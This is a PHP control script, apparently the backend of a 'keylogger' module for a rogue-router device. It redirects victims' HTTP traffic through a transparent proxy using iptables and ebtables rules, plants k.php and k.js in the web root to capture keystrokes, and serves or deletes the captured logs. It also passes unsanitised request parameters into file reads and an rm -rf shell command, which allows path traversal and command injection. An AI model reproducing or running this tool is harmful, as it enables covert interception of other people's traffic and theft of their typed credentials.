<?php

require("keylogger_vars.php");

if (isset($_GET['proxy']))
{
	if (isset($_GET['start']))
	{
		exec("ebtables -t broute -A BROUTING -p IPv4 --ip-protocol 6 --ip-destination-port 80 -j redirect --redirect-target ACCEPT");
		exec("iptables -t nat -A PREROUTING -i br-lan -p tcp --dport 80 -j REDIRECT --to-port 8008 ! -d ".$keylogger_hook_ip);

		$cmd = "echo ".$module_path."proxy.sh | at now";
	}
	if (isset($_GET['stop']))
	{
		$rule_iptables_number = exec("iptables -t nat --line-numbers -n -L | grep 80 | grep 8008 | awk {'print $1'}") != "" ? 1 : 0;
		exec("iptables -t nat -D PREROUTING ".$rule_iptables_number);

		$rule_ebtables_number = exec("ebtables -t broute -L --Lc --Ln | grep 80 | awk -F. {'print $1'}") != "" ? 1 : 0;
		exec("ebtables -t broute -D BROUTING ".$rule_ebtables_number);

		$cmd = "kill `ps -ax | grep proxy.rb | grep -v -e grep | grep -v -e php | awk {'print $1'}`";
	}
}

if (isset($_GET['clean']))
{
	$cmd = "rm -rf ".$module_path."capture/*.txt &";
}

if (isset($_GET['set']))
{
	exec ("cp ".$module_path."k.php /www/ &");
	exec ("cp ".$module_path."k.js /www/ &");
	exec ("ln -s ".$module_path."capture /www/capture &");
}
if (isset($_GET['remove']))
{
	exec ("rm -rf /www/k.php &");
	exec ("rm -rf /www/k.js &");
	exec ("rm -rf /www/capture &");
}

if (isset($_GET['load']))
{
	if (isset($_GET['file']))
	{
		$log_date = date ("F d Y H:i:s", filemtime($module_path."capture/".$_GET[file]));
		echo "capture ".$_GET['file']." [".$log_date."]\n";
		echo file_get_contents($module_path."capture/".$_GET['file']);
	}
}

if (isset($_GET['delete']))
{
	if (isset($_GET['file']))
	{
		$cmd = "rm -rf ".$module_path."capture/".$_GET['file']."*";
	}
}

if (isset($_GET['install_dep']))
{
	exec("echo \"<?php echo 'working'; ?>\" > ".$module_path."status.php");
	$cmd = "echo \"sh ".$module_path."install.sh\" | at now";
}

if($cmd != "")
{
	$output = shell_exec($cmd);

	if($output != "")
		echo trim($output);
}

?>
